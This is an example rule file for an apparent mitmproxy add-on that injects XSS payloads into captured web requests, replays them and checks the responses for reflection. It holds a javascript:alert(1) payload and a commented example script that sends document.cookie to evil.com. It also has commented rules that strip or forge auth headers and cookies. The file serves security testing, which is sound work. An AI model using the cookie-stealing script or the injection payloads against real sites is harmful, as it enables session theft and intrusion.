# ============================================================
# flow.actions — Example Rule File
# ============================================================
# Manual usage:
#   flow.actions @all ./rules.yml
#   flow.actions @focus ./rules.yml
#
# Auto-watch (applies to matching incoming flows):
#   flow.actions.watch "~u example.com" ./rules.yml
#   flow.actions.stop
# ============================================================

name: "advanced-xss"
description: "Targeted XSS with specific parameter overrides"

# ----------------------------------------------------------
# Variables: define payloads once, reference everywhere.
# YAML handles quotes, '=', HTML, multi-line — no escaping.
# ----------------------------------------------------------
vars:
  payload_a: "<button form='search-form' formaction='javascript:alert(1)'>Click</button>"
  canary: "lolo"

  # Multi-line payloads work with YAML block scalars:
  # complex_js: |
  #   <script>
  #     fetch('https://evil.com/log?c=' + document.cookie);
  #   </script>

# ----------------------------------------------------------
# Action Groups: each group is a pipeline applied per flow.
#
# Execution order within a group:
#   1. Filter (only_ids / exclude_ids)
#   2. duplicate (copy flow if true)
#   3. replace_params (modify existing params)
#   4. add_params (inject new params)
#   5. remove_headers_cookies (remove headers/cookies)
#   6. set_headers_cookies (set/overwrite headers/cookies)
#   7. replay (replay the request)           — after all modifications
#   8. search (search the response)          — after replay
#   9. find_important_headers_cookies        — terminal (does its own replays)
# ----------------------------------------------------------
action-groups:

  # --- Group 1: Duplicate, inject, replay, verify ----------
  - duplicate: true

    replace_params:
      # Fallback: applied to params NOT explicitly named below.
      # all: true  → replace ALL unmatched params
      # all: false → replace only the FIRST unmatched param (default)
      fallback_payload:
        value: { var: payload_a }
        all: true

      # Named param overrides (take priority over fallback)
      params1: { var: canary }
      user_id: "keep-this-valid"       # Direct string (no var lookup)

    add_params:
      new_key: { var: payload_a }

    # Replay the modified request
    replay: true

    # Search the response for our payload (no replay — already done above)
    search:
      # What to search for in the response
      # Can be:  "literal string"
      #          { var: single_name }
      #          { var: [name1, name2] }   ← array of vars
      value: { var: payload_a }

      # Where to search:  "body" | "header"
      in: "body"

      # Mark on success (mitmproxy emoji)
      found_mark: ":syringe:"

      # When value resolves to multiple strings:
      #   OR  (default) → success if ANY value found
      #   AND            → success only if ALL values found
      condition: "OR"

    # Filtering (optional):
    # only_ids: ["8a2A2..."]       # ONLY run on these flow IDs
    # exclude_ids: ["9a2b1..."]    # Skip these flow IDs

  # --- Group 2: Find important headers & cookies -----------
  # Uncomment to identify which headers/cookies are essential
  # for the request to succeed. Each one is removed individually,
  # the request is replayed, and the response is compared.
  #
  # - find_important_headers_cookies:
  #     scope: "both"                     # "headers" | "cookies" | "both"
  #     output: "./important_results.json" # optional, logs if omitted

  # --- Group 3: Remove headers & cookies -------------------
  # - remove_headers_cookies:
  #     headers:
  #       - "X-Custom-Header"
  #       - "Authorization"
  #     cookies:
  #       - "tracking"
  #       - "analytics_id"
  #   replay: true

  # --- Group 4: Set headers & cookies -----------------------
  # - set_headers_cookies:
  #     headers:
  #       X-Custom-Header: "injected-value"
  #       Authorization: "Bearer fake-token"
  #     cookies:
  #       session_id: "abc123"
  #       role: "admin"
  #   replay: true

  # --- Group 5: In-place modification (no duplicate) -------
  # - duplicate: false
  #   replace_params:
  #     auth_token: "expired_jwt"
  #     session_id: "invalid"
  #   replay: true
